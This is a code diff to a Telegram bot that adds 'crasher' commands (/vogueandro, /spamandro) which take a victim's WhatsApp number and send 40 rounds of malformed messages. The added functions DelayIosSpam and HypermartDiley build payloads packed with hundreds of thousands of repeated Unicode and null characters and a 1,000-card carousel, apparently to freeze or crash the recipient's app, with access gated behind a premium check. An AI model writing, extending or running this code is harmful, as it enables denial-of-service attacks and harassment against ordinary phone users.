@@ -738,6 +738,8 @@ Prefix      : /
 
 A N D R O I D
 /spamandro  : Hard Delay 100%
+/vogueandro : Delay Invisible Hard
+/androinvis : Delay Hard V2
 
 ──────────────────────────
 
@@ -1694,6 +1696,240 @@ Please verify the target input and system status before retrying.`
     }
 });
 
+bot.command('vogueandro', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/vogueandro <target_number>
+
+Example:
+/vogueandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Processing
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`
+                    }]
+                ]
+            }
+        });
+        
+        // 🚀 ISOLATED WORKER (PARALLEL SAFE)
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random(); // unik per user instance
+            
+            for (let i = 0; i < 40; i++) {
+                
+                try {
+                    
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    
+                    await HypermartDiley(sock, target);
+                    await sleep(3000);
+                    
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(err);
+                }
+            }
+            
+            try {
+                await ctx.telegram.editMessageCaption(
+                    ctx.chat.id,
+                    sent.message_id,
+                    undefined,
+                    `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : SUCCESS
+
+──────────────────────────
+All processes completed successfully.
+</pre>`,
+                    {
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`
+                                }]
+                            ]
+                        }
+                    }
+                );
+            } catch (e) {
+                console.log(`[WORKER ${instanceId}] Final update failed`);
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })(); // 🔥 DETACHED → NON BLOCKING
+        
+        // handler langsung selesai di sini (tidak nunggu worker)
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
+bot.command('spamandro', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Processing
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`
+                    }]
+                ]
+            }
+        });
+        
+        // 🚀 ISOLATED WORKER (PARALLEL SAFE)
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random(); // unik per user instance
+            
+            for (let i = 0; i < 40; i++) {
+                
+                try {
+                    
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    
+                    await DelayIosSpam(sock, target);
+                    await sleep(3000);
+                    
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(err);
+                }
+            }
+            
+            try {
+                await ctx.telegram.editMessageCaption(
+                    ctx.chat.id,
+                    sent.message_id,
+                    undefined,
+                    `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : SUCCESS
+
+──────────────────────────
+All processes completed successfully.
+</pre>`,
+                    {
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`
+                                }]
+                            ]
+                        }
+                    }
+                );
+            } catch (e) {
+                console.log(`[WORKER ${instanceId}] Final update failed`);
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })(); // 🔥 DETACHED → NON BLOCKING
+        
+        // handler langsung selesai di sini (tidak nunggu worker)
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
 bot.command('spamiphone', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -2315,6 +2551,146 @@ async function Xvzzk(sock, target) {
     }, { participant: { jid: target } });
     await new Promise((r) => setTimeout(r, 1000));
   }
+}
+
+async function DelayIosSpam(sock, target) {
+    const Vnx = await generateWAMessageFromContent(target, {
+        botInvokeMessage: {
+            message: {
+                messageContextInfo: {
+                    messageSecret: null,
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2
+                }
+            }
+        },
+        requestPhoneNumberMessage: {
+            locationMessage: {
+                degreesLatitude: -99.9870,
+                degreesLongitude: 107.8909,
+                name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
+                address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
+                url: "t.me/LuNgapainMakLuGwjilat",
+                jpegThumbnail: null
+            }
+        },
+        interactiveResponseMessage: {
+            body: {
+                text: "VnX",
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: JSON.stringify({
+                    values: {
+                        in_pin_code: "999999",
+                        building_name: "VnX",
+                        landmark_area: "18",
+                        address: "P0K3",
+                        tower_number: "P0k3",
+                        city: "tobrut",
+                        name: "p0k3",
+                        phone_number: "999999999999",
+                        house_number: "13135550002",
+                        floor_number: "@3135550202",
+                        state: "X" + "\u0000".repeat(900000)
+                    }
+                }),
+                version: 3
+            }
+        }
+    }, { userJid: sock.user.id });
+
+    await sock.relayMessage("status@broadcast", Vnx.message, {
+        messageId: Vnx.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: { status_setting: "contacts" },
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
+}
+
+async function HypermartDiley(sock, jid) {
+  let cards = [];
+  for (let i = 0; i < 1000; i++) {
+  cards.push({
+    body: {
+      text: " "
+    },
+    footer: {
+      text: " "
+    },
+    header: {
+      title: "",
+       hasMediaAttachment: true,
+          imageMessage: {
+           url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
+            mimetype: "image/jpeg",
+            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
+            fileLength: "999999",
+            height: 1,
+            width: 1,
+            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
+            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
+             directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1737281900",
+              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
+               scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
+               scanLengths: [3537, 10557, 1905, 2353],
+               midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
+          },
+       },
+       nativeFlowMessage: {
+         buttons: [{
+           name: "call_permission_request",
+           buttonParamsJson: JSON.stringify({
+             status: true,
+             type: "videocall"
+           })
+         }]
+       }
+    });
+  }
+  
+  const msg = await generateWAMessageFromContent(jid, {
+    groupStatusMessageV2: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: {
+            text: "kmu mau aku balik kyk dulu?"
+          },
+          footer: {
+            text: "aku sendiri udh gabisa berikir kyk gitu"
+          },
+          header: {
+            hasMediaAttachment: true
+          },
+          carouselMessage: {
+            cards: [...cards]
+          }
+        }
+      }
+    }
+  }, {});
+  
+  await sock.relayMessage(jid, msg.message, {
+    messageId: msg.key.id, 
+    participant: { jid: jid }
+  });
 }
 
 bot.launch()
